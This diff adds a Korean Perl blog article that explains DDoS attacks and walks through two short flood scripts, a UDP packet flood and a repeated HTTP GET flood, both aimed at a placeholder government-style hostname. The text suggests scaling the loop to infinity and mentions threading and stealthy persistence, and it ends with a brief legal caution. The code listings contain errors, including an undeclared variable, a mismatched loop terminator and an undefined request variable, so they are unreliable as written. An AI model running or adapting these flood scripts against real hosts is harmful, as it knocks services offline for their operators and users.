@@ -1,0 +1,194 @@
+Title:    DDoS가 무엇인가요?
+Package:  Seoul.pm
+Category: perl
+Category: Seoul.pm
+Author:   keedi
+
+저자
+-----
+
+[@keedi][twitter-keedi] - Seoul.pm 리더, Perl덕후,
+[거침없이 배우는 펄][yes24-4433208]의 공동 역자, keedi.k _at_ gmail.com
+
+
+시작하며
+---------
+
+가끔 특정 사이트가 DDoS 공격으로 인해 서비스 장애가 일어났다는 기사를 접하기도 합니다.
+[DDoS][wiki-ddos]는 DoS(서비스 거부 공격, Denial of Service attack)의 기법 중 하나인
+분산 서비스 거부 공격(Distributed DoS, DDoS, 디도스)입니다.
+여러 시스템을 이용해 공격을 시도하며 다양한 방법을 통해 동시에 공격하는 것으로,
+서버의 네트워크 및 전산 자원을 빠르게 고갈시켜 네트워크가 먹통이 되게 만든다거나
+원활한 서비스 이용이 불가능하게 만드는 것이 핵심입니다.
+
+![일반인(?)의 흔한 DDoS 공격][img-1-resize]
+*그림 1.* 일반인(?)의 흔한 DDoS 공격 ([원본][img-1] / [출처][home-raiseup-ddos])
+
+특별히 취약점을 공략하거나, 침투를 해야하는 것이 아니기 때문에,
+공격을 시도할 여러 시스템을 확보하는 것이 관건이지 공격 자체가 기술적으로 어려운 것은 아닙니다.
+대표적으로 특정 웹 사이트에 접속한 뒤 브라우저의 갱신 버튼인 `F5`를 지속적으로
+연타하는 것 역시 여러 시스템에서 행한다면 일종의 DDoS 공격으로 볼 수 있습니다.
+그럼에도 불구하고 효율성의 측면에서 대부분의 공격자들은 간단한 스크립트를 작성해서 공격을 시도하는 것 같습니다.
+DDoS라... 이름은 그럴 듯해서 엄청난 것 같지만 과연 이런 스크립트에는 이론적으로 어떤 기법이 들어 있을까요?
+
+
+준비물
+-------
+
+필요한 모듈은 다음과 같습니다.
+두 모듈 모두 따로 설치하지 않아도 Perl 5와 같이 배포되는 기본 모듈입니다.
+
+- [CPAN의 Socket 모듈][cpan-socket]
+- [CPAN의 IO::Socket 모듈][cpan-io-socket]
+
+직접 [CPAN][cpan]을 이용해서 설치한다면 다음 명령을 이용해서 모듈을 설치합니다.
+
+    #!bash
+    $ sudo cpan \
+        IO::Socket \
+        Socket
+
+사용자 계정으로 모듈을 설치하는 방법을 정확하게 알고 있거나
+[perlbrew][home-perlbrew]를 이용해서 자신만의 Perl을 사용하고 있다면
+다음 명령을 이용해서 모듈을 설치합니다.
+
+    #!bash
+    $ cpan \
+        IO::Socket \
+        Socket
+
+
+UDP 범람
+---------
+
+UDP 범람(flooding)의 경우 [SYNFlood][wiki-synflood] 등의 기법과는 달리 빠른 시간 내에
+네트워크 대역폭을 소모 시키는 것이 목적으로 가장 흔하게 사용하는 DDoS 공격 중 하나일 것입니다.
+UDP의 특성상 작고 빠른 요청이 가능하기 때문에 `Socket` 기본 모듈만 사용해도
+비교적 간단히 스크립트를 작성할 수 있습니다.
+
+    #!perl
+    use utf8;
+    use strict;
+    use warnings;
+    use feature qw( say );
+
+    use Socket;
+
+    my $host = "www.fresident.go.xx";
+    my $port = 80;
+    my $max = 10;
+
+    my @ips = gethostbyname($host) or die "cannot resolve $host: $!\n";
+    @ips = map { inet_ntoa($_) } @ips[4 .. $#ips];
+    say for @ips;
+
+    socket( my $sock, PF_INET, SOCK_DGRAM, 17 )
+        or die "socket: $!\n";
+
+    my $count = 0;
+    while ( $count < $max ) {
+        my @chars = ( "0" .. "9", "a" .. "z", "A" .. "Z" );
+        my $str = q{};
+        $str .= $chars[ int( rand( scalar(@chars) ) ) ] for 1 ..1024;
+        $size = int( rand( 1024 - 64 ) ) + 64;
+
+        my $packet = pack "a$size", $str;
+
+        for my $ip (@ips) {
+            my $iaddr = inet_aton("$ip")
+                or die "cannot resolve ip: $ip\n";
+            printf "$count: $ip\n", ++$count;
+            send( $sock, $packet, 0, pack_sockaddr_in( $port, $iaddr ) );
+        }
+    );
+
+간단하죠? 우선 `gethostbyname()` 함수를 이용해 도메인 네임을 IP로 풀이를 합니다.
+사이트에 따라 다르겠지만 부하 분산이 되어있는 대부분의 사이트는
+여러 서버로 구성되었기 때문에 IP 목록을 확보할 수 있습니다.
+이후 `socket()` 함수를 이용해서 UDP 연결용 소켓을 생성합니다.
+전송할 자료는 특별히 의미가 없으므로 64 ~ 1024개의 랜덤 문자열을 생성하고
+이를 `pack()`을 이용해 적절히 바이너리 형식으로 전환합니다.
+이후 IP 주소를 `inet_aton()` 함수를 이용해서 소켓에서 사용할 수 있게 변경하고,
+`send()` 함수로 소켓에 랜덤 문자열을 날려버리면 끝입니다.
+마지막으로 이런 요청을 몇 번이나 수행할지는 `$max` 변수로 조정하겠죠.
+
+
+HTTP 범람
+----------
+
+HTTP 범람(flooding)은 말그대로 HTTP 프로토콜을 이용해서 요청을 보내는 것입니다.
+솔직히 여러번 요청한다는 점을 제외한다면 평범한 HTTP 요청과 다를바 없습니다.
+이번에는 `IO::Socket` 모듈을 사용해볼까요?
+
+    #!perl
+    use utf8;
+    use strict;
+    use warnings;
+
+    use IO::Socket;
+
+    my $host = "www.fresident.go.xx:80";
+    my $max = 10;
+
+    my $count = 0;
+    while ( $count < $max ) {
+        my $sock = IO::Socket::INET->new(
+            Proto    => "tcp",
+            PeerAddr => $host,
+        ) or die "cannot bind : $!\n";
+
+        print $sock "GET /?$_ HTTP/1.0\r\n\r\n";
+
+        my $res = <$sock>;
+        printf "$count: $res", ++$count;
+
+        close($sock);
+    }
+
+HTTP 요청을 도와주는 [CPAN][cpan] 모듈은 무척 많지만,
+단순히 첫 페이지 정도 요청해서 응답 코드를 확인하는 것이 전부라면
+굳이 [LWP 모듈][cpan-lwp]이나 [HTTP::Tiny 모듈][cpan-http-tiny]까지
+쓰지 않고 `Socket` 또는 `IO::Socket` 모듈을 쓰는 것으로도 충분합니다.
+특별히 DDoS 공격이 아니더라도, 구축한 시스템의 성능을 파악하거나,
+설치한 웹방화벽이 잘 동작하는지 확인하는 용도로도 유용하게 사용할 수 있습니다.
+필요하다면 `$max` 값을 충분히 큰 값으로 설정한다던가, 또는 무한 반복문 형태로 바꿀 수도 있겠죠.
+
+
+정리하며
+---------
+
+간단히 DDoS 공격 스크립트 그 자체에 대해서 알아보았습니다.
+아무래도 어떻게 공격하는지 알아야 어떤식으로 예방해야 할지에도 도움이 될테구요.
+꽤 거창해보였는데 막상 코드를 들여다보니 김빠지죠?
+DDoS 요청도 프로토콜 상의 특징을 이용하는 만큼 여러가지 기법이 더 있겠지만
+큰 틀에서 봤을때 짧은 시간에 감당할 수 없는 요청을 보내는 것이 핵심이다보니
+막상 요청을 보내는 부분 자체는 비교적 간단한 편입니다.
+그렇기 때문에 해당 요청이 악의를 가진 것인지 평범한 요청인지 구분하기 어려운 것이 사실이기도 하구요.
+DDoS의 경우 요청 자체보다는 어떻게 하면 요청을 보낼 수 있는 네트워크 자원을 확보하냐는 것이 중요하기도 합니다.
+물론 DDoS 스크립트도 프로그램이다보니 어떻게하면 더 효율적으로 짧은 시간에 많은 요청을
+생성하는지 고민할테고, 이를 위해 쓰레드를 사용한다던가, 티나지 않게 시스템에서 상주하면서
+필요할때 동작하게 한다던가 등도 고민할 것 같군요.
+브라우저에서 F5를 누르는 행동을 범죄라고 보기는 좀 어려울 것 같으나,
+아! 그리고 어찌됐든 DDoS 공격도 어느정도 위법하게 보는 시각이 있으니
+이런 류의 스크립트를 함부로 구동하는 것은 법적으로 매우 위험하다는 점 잊지 마세요. :-)
+
+Enjoy Your Perl! ;-)
+
+_EOT_
+
+
+[img-1]:                    2016-12-02-1.jpg
+
+[img-1-resize]:             2016-12-02-1_r.jpg
+
+[cpan-http-tiny]:           https://metacpan.org/pod/HTTP::Tiny
+[cpan-io-socket]:           https://metacpan.org/pod/IO::Socket
+[cpan-lwp]:                 https://metacpan.org/pod/LWP
+[cpan-socket]:              https://metacpan.org/pod/Socket
+[cpan]:                     http://www.cpan.org/
+[home-perlbrew]:            http://perlbrew.pl/
+[home-raiseup-ddos]:        https://www.facebook.com/raiseup1114/photos/a.953404921396900.1073741827.953396081397784/1297833713620684/?type=3
+[twitter-keedi]:            http://twitter.com/#!/keedi
+[wiki-ddos]:                https://en.wikipedia.org/wiki/Denial-of-service_attack#DDoS_extortion
+[wiki-synflood]:            https://en.wikipedia.org/wiki/SYN_flood
+[yes24-4433208]:            http://www.yes24.com/24/goods/4433208
